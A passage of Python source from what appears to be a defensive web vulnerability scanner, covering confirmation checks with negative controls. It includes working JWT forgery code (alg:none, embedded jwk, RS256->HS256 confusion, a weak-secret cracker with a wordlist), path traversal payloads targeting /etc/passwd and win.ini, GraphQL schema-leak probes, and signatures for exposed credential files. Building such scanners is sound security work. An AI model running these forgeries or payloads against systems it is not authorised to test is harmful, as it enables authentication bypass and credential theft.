        # Negative control FIRST: a token with a CORRUPTED signature but the real alg.
        # If the server accepts that too, it isn't verifying signatures at all -- a
        # much bigger (and different) problem than alg:none specifically, and this
        # check can't attribute the bypass to alg:none on its own, so it stays quiet.
        control = http.fetch(url, extra_headers={header_name: rebuild(f"{parts[0]}.{parts[1]}.{corrupted_sig}")})
    except _ActiveError:
        return None
    if 200 <= int(control.get("status") or 0) < 300:
        return None
    for forged in forged_variants:
        try:
            probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
        except _ActiveError:
            continue
        if not (200 <= int(probe.get("status") or 0) < 300):
            continue
        auth_body = str(probe.get("body") or "")
        sim = _body_similar(auth_body, baseline_body)
        if sim < _JWT_BODY_SAME:
            # 2xx but NOT the authenticated content — a signature-verifying server can still serve an
            # anonymous/public page with 200 for a token it decoded to "no valid claims". Not a bypass.
            continue
        proof = _proof(
            "confirmed", method=f"GET with a forged alg:none {header_name}",
            affected_asset="every endpoint behind this authentication check",
            observed_result=f"the unsigned (alg:none) token was accepted (HTTP {probe['status']}) and returned the SAME authenticated content as the real-token baseline ({sim:.0%} body match, HTTP {baseline['status']})",
            control_result=f"a token with a corrupted signature (same algorithm) was rejected (HTTP {control['status']}) — the server does verify signatures normally",
            evidence="alg:none acceptance confirmed via a real-token baseline (body-matched), plus a corrupted-signature negative control",
        )
        ev = {
            "request_line": f"GET {url}",
            "request_header": f"{header_name}: <forged alg:none token>",
            "response_status": f"HTTP {probe['status']}",
            "matched_value": "unsigned token accepted as authenticated",
        }
        # The authenticated response the forged token unlocked — the concrete data an attacker
        # reads once signature verification is bypassed. Guarded so a trivially-empty body is
        # not rendered; _finding() redacts it once.
        if len(auth_body.strip()) >= 8:
            ev["read_data"] = auth_body[:1200]
        return _finding(
            "active.jwt-alg-none", "JWT alg:none accepted (signature verification bypass)",
            "critical", "jwt", "jwt", url, proof, ev,
        )
    return None


def _rsa_jwk_and_signer() -> tuple[dict[str, str], Any] | None:
    """A freshly generated RSA keypair as (public JWK dict, sign(bytes) -> signature).

    The key is minted per probe and never leaves the process, so the "attacker key" in the proof is
    demonstrably ours. Returns None when ``cryptography`` is unavailable — the same optional-dependency
    treatment the alg-confusion check gives it, so the check simply does not fire rather than erroring.
    """
    try:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding, rsa
    except Exception:  # noqa: BLE001 - optional dep
        return None
    try:
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        numbers = key.public_key().public_numbers()
    except Exception:  # noqa: BLE001 - a backend that cannot generate a key is a clean skip
        return None

    def _int_b64(value: int) -> str:
        return _b64url_encode(value.to_bytes((value.bit_length() + 7) // 8 or 1, "big"))

    jwk = {"kty": "RSA", "n": _int_b64(numbers.n), "e": _int_b64(numbers.e), "alg": "RS256", "use": "sig"}
    return jwk, (lambda data: key.sign(data, padding.PKCS1v15(), hashes.SHA256()))


def _check_jwt_jwk_embedded(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
    """Confirm the server verifies a token with a key the TOKEN ITSELF carries (the ``jwk`` JOSE
    header, CVE-2018-0114's class) — unauthenticated, total token forgery.

    This is the sibling of ``oob_service.confirm_jwt_key_injection``'s out-of-band jku/x5u probe, for the case
    where the attacker does not have to host anything at all: the key travels inside the token. Where
    jku/x5u can only be observed out of band (the fetch is the tell), an embedded key needs no
    collaborator and no infrastructure, so this one runs in the ordinary pass and fires on a hunt that
    has no OOB configured. A vulnerable verifier reads the embedded public key, checks the signature
    against it, and finds it valid — because we signed with the matching private key — so any identity
    the claims assert is accepted.

    Same discipline and the same token sources as ``_check_jwt_alg_none``, and the claims are NOT
    touched: the forged token carries the real token's payload bytes verbatim, so what is proven is
    that an attacker-chosen key verifies, never a privilege the operator granted themselves. The
    differential is threefold — the real token authenticates, a corrupted-signature copy is REJECTED
    (so the server does verify), and the self-signed copy is ACCEPTED with the same authenticated body.
    """
    found = _find_jwt_credential(http.auth)
    baseline_headers: dict[str, str] | None = None
    if found is not None:
        header_name, real_token, rebuild = found
    elif discovered_token and _JWT_RE.match(discovered_token):
        header_name, real_token = "Authorization", discovered_token
        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
        baseline_headers = {header_name: rebuild(real_token)}
    else:
        return None
    parts = real_token.split(".")
    if len(parts) != 3 or not all(parts):
        return None
    minted = _rsa_jwk_and_signer()
    if minted is None:
        return None  # no crypto backend -> nothing to sign with, so nothing to prove
    jwk, sign = minted
    try:
        original_header = json.loads(_b64url_decode(parts[0]))
    # RecursionError is a RuntimeError, not a ValueError: a crafted deeply nested header from an
    # untrusted target token must be a clean skip, never a crash that aborts the pass.
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
        return None
    if not isinstance(original_header, dict):
        return None
    try:
        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
    except _ActiveError:
        return None
    if not (200 <= int(baseline.get("status") or 0) < 300):
        return None
    baseline_body = str(baseline.get("body") or "")
    if len(" ".join(baseline_body.split())) < _JWT_MIN_BODY:
        return None  # nothing substantive to differentiate against -> a bypass cannot be shown here
    # Negative control FIRST: a corrupted signature under the token's OWN algorithm must be rejected.
    # A server that accepts that is not verifying at all, which this check cannot attribute to jwk.
    try:
        control = http.fetch(url, extra_headers={
            header_name: rebuild(f"{parts[0]}.{parts[1]}.{_corrupt_jwt_signature(parts[2])}")})
    except _ActiveError:
        return None
    if 200 <= int(control.get("status") or 0) < 300:
        return None
    forged_header = {"alg": "RS256", "typ": str(original_header.get("typ") or "JWT"), "jwk": jwk}
    if original_header.get("kid"):
        forged_header["kid"] = original_header["kid"]  # some verifiers only consult jwk when kid matches
    try:
        head_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
        signing_input = f"{head_b64}.{parts[1]}".encode("ascii")
        forged = f"{head_b64}.{parts[1]}.{_b64url_encode(sign(signing_input))}"
    except (TypeError, ValueError, UnicodeEncodeError):
        return None
    try:
        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
    except _ActiveError:
        return None
    if not (200 <= int(probe.get("status") or 0) < 300):
        return None
    auth_body = str(probe.get("body") or "")
    sim = _body_similar(auth_body, baseline_body)
    if sim < _JWT_BODY_SAME:
        # 2xx without the authenticated content: a verifying server can still answer 200 with a public
        # page for a token it refused. Not a bypass.
        return None
    proof = _proof(
        "confirmed", method=f"GET with a {header_name} token carrying an attacker-generated 'jwk' key",
        affected_asset="every endpoint behind this authentication check — any identity can be signed",
        observed_result=(f"a token signed with a freshly generated key, whose PUBLIC half was embedded in the "
                         f"token's own 'jwk' header, was accepted (HTTP {probe['status']}) and returned the SAME "
                         f"authenticated content as the real-token baseline ({sim:.0%} body match)"),
        control_result=(f"a token with a corrupted signature under the original algorithm was rejected "
                        f"(HTTP {control['status']}) — the server does verify signatures, it simply trusts the key "
                        f"the token supplies"),
        evidence="self-signed 'jwk' acceptance confirmed against a real-token baseline (body-matched), plus a corrupted-signature negative control",
        limitations=("The claims were carried over from the real token unchanged, so this proves an attacker-chosen "
                     "key is trusted — the identity/role fields were deliberately not altered."),
    )
    ev = {"request_line": f"GET {url}",
          "request_header": f"{header_name}: <token with an embedded attacker 'jwk' public key>",
          "response_status": f"HTTP {probe['status']}",
          "matched_value": "self-signed token accepted — the verifier trusts the key carried in the token"}
    if len(auth_body.strip()) >= 8:
        ev["read_data"] = auth_body[:1200]
    return _finding("active.jwt-jwk-embedded",
                    "JWT 'jwk' header trusted — a self-signed token is accepted (arbitrary token forgery)",
                    "critical", "jwt", "jwt", url, proof, ev)


# Well-known JWKS locations to try (same-origin only) to recover the RSA PUBLIC key an RS256 token is
# verified with — the key material the RS256->HS256 confusion attack HMAC-signs with.
_JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")
_RS_TO_HS = {"RS256": ("HS256", hashlib.sha256), "RS384": ("HS384", hashlib.sha384), "RS512": ("HS512", hashlib.sha512)}


def _fetch_rsa_public_pems(http: _Http, url: str, kid: str = "") -> list[bytes]:
    """Best-effort fetch of the target's own RSA PUBLIC key(s), from a same-origin JWKS/OpenID-config
    path, returned as PEM (SubjectPublicKeyInfo) bytes — the material the RS256->HS256 confusion attack
    uses as the HMAC secret. Empty list if none reachable/parseable or ``cryptography`` is unavailable
    (the check then simply doesn't fire). The key is PUBLIC, so fetching it discloses nothing."""
    try:
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    except Exception:  # noqa: BLE001 - optional dep
        return []
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    pems: list[bytes] = []
    for path in _JWKS_PATHS:
        try:
            resp = http.fetch(f"{origin}{path}")
        except _ActiveError:
            continue
        try:
            doc = json.loads(resp.get("body") or "")
        # RecursionError guards against a deeply-nested JWKS served by the target (json.loads raises
        # RecursionError, not ValueError) — skip that key source rather than crashing the pass.
        except (ValueError, json.JSONDecodeError, RecursionError):
            continue
        # An OpenID discovery doc points at the JWKS via jwks_uri — follow it ONCE, same-host only.
        if isinstance(doc, dict) and doc.get("jwks_uri") and "keys" not in doc:
            try:
                jwks_uri = str(doc["jwks_uri"])
                if (urlparse(jwks_uri).hostname or "").lower() == (parsed.hostname or "").lower():
                    doc = json.loads((http.fetch(jwks_uri).get("body") or ""))
            # RecursionError: the followed jwks_uri may serve deeply-nested JSON — treat like any
            # other parse failure instead of letting it abort the active pass.
            except (_ActiveError, ValueError, json.JSONDecodeError, RecursionError):
                continue
        for key in (doc.get("keys") if isinstance(doc, dict) else None) or []:
            if not isinstance(key, dict) or key.get("kty") != "RSA" or not key.get("n") or not key.get("e"):
                continue
            if kid and key.get("kid") and str(key.get("kid")) != kid:
                continue  # match the token's kid when both are present
            try:
                n = int.from_bytes(_b64url_decode(str(key["n"])), "big")
                e = int.from_bytes(_b64url_decode(str(key["e"])), "big")
                pem = RSAPublicNumbers(e, n).public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
                pems.append(pem)
            except (ValueError, binascii.Error, TypeError):
                continue
        if pems:
            break
    return pems[:4]


def _check_jwt_alg_confusion(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
    """Confirm RS256->HS256 ALGORITHM CONFUSION: the server verifies its JWTs with an RSA PUBLIC key
    but can be tricked into treating a token as HS256 (symmetric), so a token HMAC-signed with that
    PUBLIC key — which anyone can fetch from the JWKS — is accepted as authentic. Token forgery / full
    auth bypass. GET-only forged-token replay; same token sources + differential discipline as the
    alg:none check (real RS token authenticates, corrupted-sig REJECTED, HS(pubkey) forgery ACCEPTED)."""
    found = _find_jwt_credential(http.auth)
    baseline_headers: dict[str, str] | None = None
    if found is not None:
        header_name, real_token, rebuild = found
    elif discovered_token and _JWT_RE.match(discovered_token):
        header_name, real_token = "Authorization", discovered_token
        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
        baseline_headers = {header_name: rebuild(real_token)}
    else:
        return None
    parts = real_token.split(".")
    if len(parts) != 3 or not all(parts):
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    # RecursionError (not a ValueError subclass) from a crafted deeply-nested header must not crash
    # the pass — a malformed token is simply not proof of alg confusion.
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
        return None
    alg = str(header.get("alg", "")).strip().upper() if isinstance(header, dict) else ""
    if alg not in _RS_TO_HS:
        return None  # confusion only applies when the server EXPECTS an asymmetric (RS*) algorithm
    try:
        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
    except _ActiveError:
        return None
    if not (200 <= int(baseline.get("status") or 0) < 300):
        return None
    baseline_body = str(baseline.get("body") or "")
    if len(" ".join(baseline_body.split())) < _JWT_MIN_BODY:
        return None  # no substantive authenticated body to differentiate against -> can't prove a bypass
    pems = _fetch_rsa_public_pems(http, url, kid=str(header.get("kid") or ""))
    if not pems:
        return None  # no public key reachable -> can't forge, nothing to prove
    # Negative control: a corrupted RS signature MUST be rejected (proves the server verifies at all).
    corrupted = f"{parts[0]}.{parts[1]}.{_corrupt_jwt_signature(parts[2])}"
    try:
        control = http.fetch(url, extra_headers={header_name: rebuild(corrupted)})
    except _ActiveError:
        return None
    if 200 <= int(control.get("status") or 0) < 300:
        return None  # server doesn't verify signatures at all -> not attributable to alg-confusion
    hs_alg, digest = _RS_TO_HS[alg]
    forged_header = dict(header)
    forged_header["alg"] = hs_alg
    try:
        hdr_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
    except (TypeError, ValueError):
        return None
    signing_input = f"{hdr_b64}.{parts[1]}".encode("ascii")
    for pem in pems:
        sig = _b64url_encode(hmac.new(pem, signing_input, digest).digest())
        forged = f"{hdr_b64}.{parts[1]}.{sig}"
        try:
            probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
        except _ActiveError:
            continue
        if not (200 <= int(probe.get("status") or 0) < 300):
            continue
        auth_body = str(probe.get("body") or "")
        sim = _body_similar(auth_body, baseline_body)
        if sim < _JWT_BODY_SAME:
            # 2xx but NOT the authenticated content — a signature-verifying server can still serve an
            # anonymous/public page with 200 for a forged token it rejects. Not a proven forgery.
            continue
        proof = _proof(
            "confirmed", method=f"GET with an RS256->HS256 confused token ({hs_alg}, HMAC-signed with the RSA public key)",
            affected_asset="every endpoint behind this authentication check — a forged token grants any identity/role",
            observed_result=f"a token re-signed as {hs_alg} using the target's own RSA public key was accepted (HTTP {probe['status']}) and returned the SAME authenticated content as the real-token baseline ({sim:.0%} body match, HTTP {baseline['status']})",
            control_result=f"a token with a corrupted RS signature was rejected (HTTP {control['status']}) — the server does verify signatures, so accepting the public-key HMAC proves algorithm confusion",
            evidence="RS256->HS256 confusion confirmed: forgery signed with the public JWKS key accepted (body-matched), corrupted-signature control rejected",
        )
        ev = {
            "request_line": f"GET {url}",
            "request_header": f"{header_name}: <token forged as {hs_alg}, HMAC key = the RSA public key>",
            "response_status": f"HTTP {probe['status']}",
            "matched_value": f"{alg}->{hs_alg} algorithm-confusion forgery accepted as authenticated",
        }
        if len(auth_body.strip()) >= 8:
            ev["read_data"] = auth_body[:1200]
        return _finding(
            "active.jwt-alg-confusion", "JWT RS256->HS256 algorithm confusion (token forgery via the public key)",
            "critical", "jwt", "jwt", url, proof, ev,
        )
    return None


# A small, CONSTANT list of the notoriously-weak HMAC signing secrets that turn up in real
# programs (framework defaults, tutorials, the top of every jwt-cracking list). This is a
# known-bad check, not a fuzzing wordlist — kept tiny on purpose.
_JWT_WEAK_SECRETS: tuple[str, ...] = (
    "secret", "secretkey", "secret_key", "password", "changeme", "change_me", "admin",
    "jwt", "jwtsecret", "jwt_secret", "token", "key", "private", "test", "root",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t", "qwerty", "123456",
    "0000", "default", "example", "mysecret", "my_secret", "app_secret", "hmac", "signature",
)
_JWT_HS_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _crack_jwt_hs_secret(token: str) -> tuple[str, str] | None:
    """OFFLINE-recover a weak HMAC secret for an HS256/384/512 token by byte-comparing the real
    signature against HMAC(secret, "header.payload") for each candidate. Zero network. Returns
    (secret, alg) on a self-certifying match, else None — the compare is cryptographic
    byte-equality over a 256+-bit MAC, so it cannot false-positive."""
    parts = token.split(".")
    if len(parts) != 3 or not all(parts):
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        real_sig = _b64url_decode(parts[2])
    # RecursionError from a crafted deeply-nested header must not crash the pass; a malformed
    # token is simply un-crackable, not an error to propagate.
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
        return None
    alg = str(header.get("alg", "")).strip().upper() if isinstance(header, dict) else ""
    digest = _JWT_HS_DIGEST.get(alg)
    if digest is None:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    for secret in _JWT_WEAK_SECRETS:
        expected = hmac.new(secret.encode("utf-8"), signing_input, digest).digest()
        if len(expected) == len(real_sig) and hmac.compare_digest(expected, real_sig):
            return secret, alg
    return None


def _check_jwt_weak_secret(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
    """Recover a weak HMAC signing secret for a JWT (OFFLINE, self-certifying), then corroborate by
    signing a MINIMALLY-MODIFIED benign token that was never issued and showing the server accepts
    it. No privilege claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens.

    The token is the operator's own credential when there is one, and OTHERWISE the token the TARGET
    ITSELF handed back (the same source the alg:none and alg-confusion checks already use). Without
    that second source this check was unreachable in the hunt the operator runs most — an
    unauthenticated one — even though an app that hands an anonymous visitor an HS256 guest token and
    signs it with 'secret' is precisely the case the offline cracker exists to catch, and the crack
    costs zero requests. Opt-in-by-having-a-token either way; it still never invents a session."""
    found = _find_jwt_credential(http.auth)
    baseline_headers: dict[str, str] | None = None
    if found is not None:
        header_name, real_token, rebuild = found
    elif discovered_token and _JWT_RE.match(discovered_token):
        header_name, real_token = "Authorization", discovered_token
        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
        # The operator-credential path gets its authenticated baseline for free (_Http.fetch attaches
        # the session same-site). A DISCOVERED token does not, so the baseline must carry the real
        # token explicitly — otherwise the corroboration below would compare a forged-token response
        # against an ANONYMOUS one and call a public 200 page "accepted".
        baseline_headers = {header_name: rebuild(real_token)}
    else:
        return None
    cracked = _crack_jwt_hs_secret(real_token)
    if cracked is None:
        return None  # the offline crack IS the finding-cost; no crack -> silent, zero requests
    secret, alg = cracked
    parts = real_token.split(".")
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
        payload = {}
    payload = dict(payload) if isinstance(payload, dict) else {}
    payload["greyiq_poc"] = _MARK  # a benign marker claim — NOT a role/scope/sub privilege field
    digest = _JWT_HS_DIGEST[alg]
    new_header = _b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode("utf-8"))
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    new_sig = _b64url_encode(hmac.new(secret.encode("utf-8"), f"{new_header}.{new_payload}".encode("ascii"), digest).digest())
    forged = f"{new_header}.{new_payload}.{new_sig}"
    # The offline crack already self-certifies; the live request only corroborates. A network
    # failure keeps the finding confirmed (the crypto is the proof).
    server_note = "the recovered secret proves forgery offline (self-certifying); not sent to the server"
    try:
        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
        # NEGATIVE CONTROL, the same one alg:none and alg-confusion take before either narrates a
        # bypass: a copy of the REAL token with a corrupted signature must be REJECTED. Without it a
        # body match proves nothing about whether the token was honoured -- on a wholly public
        # endpoint the baseline and the forged response are identical because the server never looked
        # at either token, and an earlier draft reported exactly that as "was accepted ... body match
        # 100%". That is a fabricated corroboration attached to a real finding, which is worse than
        # the vaguer wording it replaced.
        parts_real = real_token.split(".")
        control = http.fetch(url, extra_headers={
            header_name: rebuild(f"{parts_real[0]}.{parts_real[1]}.{_corrupt_jwt_signature(parts_real[2])}")})
        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
        verifies = not (200 <= int(control.get("status") or 0) < 300)
        if (verifies and 200 <= int(probe.get("status") or 0) < 300
                and 200 <= int(baseline.get("status") or 0) < 300):
            same = _body_similar(str(baseline.get("body") or ""), str(probe.get("body") or ""))
            if same >= _JWT_BODY_SAME:
                server_note = (f"a token forged with the recovered secret (a claim that was never issued) was "
                               f"accepted (HTTP {probe['status']}) and returned the same content as the real "
                               f"token (HTTP {baseline['status']}, body match {same:.0%}), while a "
                               f"corrupted-signature copy was rejected (HTTP {control['status']}) -- so the "
                               f"server does verify, and it accepted our signature")
    except _ActiveError:
        pass
    proof = _proof(
        "confirmed", method=f"offline HMAC-{alg} crack of the JWT signing secret",
        affected_asset="every identity/role/scope the token asserts — arbitrary token forgery",
        observed_result=f"the {alg} signing secret is a well-known weak value ('{secret}'), recovered offline by byte-matching HMAC-{alg} of the token's own signing input",
        control_result=server_note,
        evidence=f"HMAC-{alg}(header.payload, weak-secret) equals the token's real signature — cryptographic byte-equality, self-certifying",
    )
    ev = {"request_line": f"GET {url}", "request_header": f"{header_name}: <token forged with the recovered secret>",
          "response_status": "offline crack (self-certifying)", "matched_value": f"weak HMAC-{alg} signing secret recovered: '{secret}'"}
    return _finding("active.jwt-weak-secret", "JWT signed with a weak/guessable secret (arbitrary token forgery)",
                    "critical", "jwt", "jwt", url, proof, ev)


# Traversal payload -> the unmistakable signature of the file it reads. Each is gated by a
# same-request benign control, so a page that merely contains these words can't false-positive.
_LFI_PROBES: tuple[tuple[str, "re.Pattern[str]"], ...] = (
    ("../../../../../../etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("....//....//....//....//etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("../../../../../../windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)),
)


def _check_path_traversal(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Confirm a path traversal / local-file read on a file-ish parameter by reading ONE
    well-known, non-sensitive system file (/etc/passwd or win.ini) as proof and gating on its
    unmistakable signature PLUS a benign-value control — extracting nothing else."""
    params = _candidate_params(url, extra_params, _PATH_PARAMS, 2)
    for param in params:
        # One control per param (not per payload) keeps the request budget in check.
        try:
            control = http.fetch(_with_query(url, {param: f"{_MARK}notafile"}))
        except _ActiveError:
            continue
        ctrl_body = control.get("body") or ""
        for payload, signature in _LFI_PROBES:
            if signature.search(ctrl_body):
                continue  # the benign control already shows this signature -> not traversal-driven
            try:
                probe = http.fetch(_with_query(url, {param: payload}))
            except _ActiveError:
                break
            body = probe.get("body") or ""
            if signature.search(body):
                fname = "/etc/passwd" if "passwd" in payload else "windows/win.ini"
                proof = _proof(
                    "confirmed", method=f"GET with {param}={payload}",
                    affected_asset="arbitrary local files readable by the web process (source, config, secrets)",
                    observed_result=f"the '{param}' parameter returned the contents of {fname} — path traversal / local file inclusion",
                    control_result="a benign filename control did NOT return the file signature — the traversal is what read it",
                    evidence=f"the unmistakable {fname} signature appears in the response body",
                )
                ev = {"request_line": f"GET {_with_query(url, {param: payload})}", "response_status": f"HTTP {probe['status']}",
                      "matched_value": f"{fname} contents disclosed via '{param}'",
                      # The retrieved file content IS the demonstrated impact (redacted once by _finding).
                      "read_data": body[:1200]}
                # class_hint MUST be 'path-traversal', never 'file-upload': what this check proves is a
                # READ. Tagging it file-upload handed a confirmed file read CWE-434 and that class's
                # RCE-shaped C:H/I:H/A:H vector (8.8), and made it eligible for the attack-chain
                # technique keyed on class 'file-upload' — upload-to-execution, which GRANTS
                # exec.server-code, i.e. a code-execution chain assembled out of a
                # confidentiality-only bug. Under the right class the chain engine reaches the
                # correct row (path-traversal-read, grants read.server-file). The category stays
                # 'disclosure' (that is what a file read IS, and the report renders it under the
                # disclosure label); the hint carries the precise class.
                return _finding("active.path-traversal", f"Path traversal / local file read via '{param}' parameter",
                                "high", "disclosure", "path-traversal", url, proof, ev)
    return None


_GRAPHQL_INTROSPECTION_QUERY = "{__schema{queryType{name} types{name}}}"


def _check_graphql_introspection(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm GraphQL introspection is enabled — the schema map that turns a black-box GraphQL
    API into a listed set of hidden queries/mutations (a lead for BOLA/BFLA). Only fires on a
    graphql-shaped path, so it costs nothing elsewhere. GET-only, read-only."""
    path = (urlparse(url).path or "").lower()
    if "graphql" not in path and "graphiql" not in path:
        return None
    try:
        probe = http.fetch(_with_query(url, {"query": _GRAPHQL_INTROSPECTION_QUERY}))
    except _ActiveError:
        return None
    body = probe.get("body") or ""
    ctype = (probe["headers"].get("content-type") or "").lower()
    if '"__schema"' in body and '"queryType"' in body and ("json" in ctype or body.lstrip().startswith("{")):
        proof = _proof(
            "confirmed", method="GET introspection query on the GraphQL endpoint",
            affected_asset="the full GraphQL schema — types, queries, and mutations, including operations the UI never exposes",
            observed_result="the endpoint answered an introspection query, returning its __schema (queryType + types)",
            control_result="introspection is enabled here; production GraphQL endpoints should disable it",
            evidence="the response body contains the GraphQL __schema/queryType introspection result",
        )
        ev = {"request_line": f"GET {_with_query(url, {'query': _GRAPHQL_INTROSPECTION_QUERY})}",
              "response_status": f"HTTP {probe['status']}", "matched_value": "__schema introspection returned",
              # The returned schema IS the disclosure — capture an excerpt as the demonstration.
              "read_data": body[:1200]}
        return _finding("active.graphql-introspection", "GraphQL introspection enabled (schema disclosure)",
                        "low", "disclosure", "graphql", url, proof, ev)
    return None


# A syntactically-valid query naming a field that CANNOT exist (unguessable-unique), so a "Did you
# mean <X>" reply naming a DIFFERENT token is a genuine schema suggestion, never an echo of our probe.
_GRAPHQL_BOGUS_FIELD = "gqxNoSuchField_zx9q7"
_GRAPHQL_SUGGEST_PROBE = "{__typename " + _GRAPHQL_BOGUS_FIELD + "}"
# graphql-js / graphql-php style "did you mean" phrasing, capturing the FIRST suggested identifier.
# The reference GraphQL engines ALWAYS QUOTE the suggested name (Did you mean "user"), so REQUIRE a
# quote (optionally backslash-escaped in the raw JSON body: \"user\") immediately before the
# identifier. This rejects unquoted English prose ("Did you mean to POST?", "the query root?") that
# would otherwise false-confirm a schema leak on a graphql-ish path.
_GRAPHQL_SUGGEST_RE = re.compile(r'[Dd]id you mean\s+\\?["\'“‘`]([A-Za-z_][A-Za-z0-9_]{0,63})')


def _check_graphql_field_suggestions(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm GraphQL 'field suggestions' leak the schema even when introspection is DISABLED — the
    common misconfig the introspection check misses. A query naming a nonexistent field triggers a
    'Did you mean <real field>' validation error that enumerates the type's real fields one probe at a
    time. Benign: one syntactically-valid but nonexistent-field READ query (GraphQL validates, never
    executes it); the suggestion of a REAL name we didn't send IS the captured disclosure. Fires only
    on a graphql-shaped path; FP-proof — the response must be JSON, must be a GraphQL validation error
    ABOUT OUR probe (it echoes the unguessable bogus field), AND must suggest a DIFFERENT real name."""
    path = (urlparse(url).path or "").lower()
    if "graphql" not in path and "graphiql" not in path:
        return None
    try:
        probe = http.fetch(_with_query(url, {"query": _GRAPHQL_SUGGEST_PROBE}))
    except _ActiveError:
        return None
    body = probe.get("body") or ""
    ctype = (probe["headers"].get("content-type") or "").lower()
    if not ("json" in ctype or body.lstrip().startswith("{")):
        return None  # a GraphQL error is a JSON object — an HTML "did you mean" search page is not this
    # ANCHOR to a genuine GraphQL field-validation error about OUR probe: the server must ECHO the
    # unguessable field we sent (graphql-js/graphql-php: `Cannot query field "<bogus>" on type ...`).
    # Without this, arbitrary prose on a graphql-ish path ("Unknown operation. Did you mean to POST?")
    # would false-confirm a schema leak that isn't there.
    if _GRAPHQL_BOGUS_FIELD not in body:
        return None
    m = _GRAPHQL_SUGGEST_RE.search(body)
    if not m or m.group(1) == _GRAPHQL_BOGUS_FIELD:
        return None  # no suggestion, or it merely echoed our bogus field (not a real schema leak)
    suggested = m.group(1)  # a field OR a type name — either is a schema disclosure
    proof = _proof(
        "confirmed", method="GET a query naming a nonexistent field on the GraphQL endpoint",
        affected_asset="the GraphQL schema — field and type names are enumerable via error 'suggestions' even when introspection is disabled",
        observed_result=f"a query naming the nonexistent field the engine sent returned a 'Did you mean' error suggesting a REAL schema name ('{suggested}')",
        control_result="a randomly-named field cannot match anything, so a suggestion naming a real schema name proves the schema leaks through validation errors (introspection need not be enabled)",
        evidence="the GraphQL validation error echoes the unguessable probe field AND suggests a real schema name",
    )
    ev = {"request_line": f"GET {_with_query(url, {'query': _GRAPHQL_SUGGEST_PROBE})}",
          "response_status": f"HTTP {probe['status']}", "matched_value": f"field-suggestion schema leak (suggested '{suggested}')",
          "read_data": body[:1200]}
    return _finding("active.graphql-field-suggestions",
                    "GraphQL field suggestions leak the schema (introspection-independent)",
                    "low", "disclosure", "graphql", url, proof, ev)


# High-signal files that must never be web-served. Each is confirmed by its own unmistakable
# signature AND a catch-all control, so an app that 200s everything can't false-positive.
_EXPOSED_FILES: tuple[tuple[str, "re.Pattern[str]", str], ...] = (
    ("/.git/config", re.compile(r"\[core\][\s\S]*repositoryformatversion", re.IGNORECASE), ".git/config (source repository)"),
    ("/.env", re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}\s*=\S"), ".env (application secrets/config)"),
    # An [profile] INI section immediately followed by an aws_access_key_id line — the unmistakable
    # shape of a served AWS credentials file (cloud account takeover). Anchored so prose can't match.
    ("/.aws/credentials", re.compile(r"(?im)^\[[^\]\r\n]{1,64}\]\s*$[\s\S]{0,200}^\s*aws_access_key_id\s*="),
     ".aws/credentials (AWS account keys)"),
    # An npm registry auth-token line — a served .npmrc leaks a publish/read token for the account's
    # private packages (supply-chain). `//<host[:port][/path]>/:_authToken=` — non-greedy so it covers
    # bare registries (npmjs.org), port-qualified (Verdaccio :4873, Nexus :8081), and path-qualified
    # private registries (Artifactory/GitLab/Azure), which are the highest-value leaked-token case.
    ("/.npmrc", re.compile(r"(?im)^//[^\s]+?/:_authToken="), ".npmrc (npm registry auth token)"),
    # A served SQL DUMP — a mysqldump/pg_dump header or line-anchored DDL/INSERT. A downloadable
    # database dump is a full-data breach; the signature is anchored so prose about SQL can't match.
    # (Kept to the two highest-yield names — each row is one root probe against the per-host budget.)
    *((path, re.compile(r"(?im)^\s*-- (?:MySQL|MariaDB|PostgreSQL|SQL)[^\r\n]{0,40}[Dd]ump\b|"
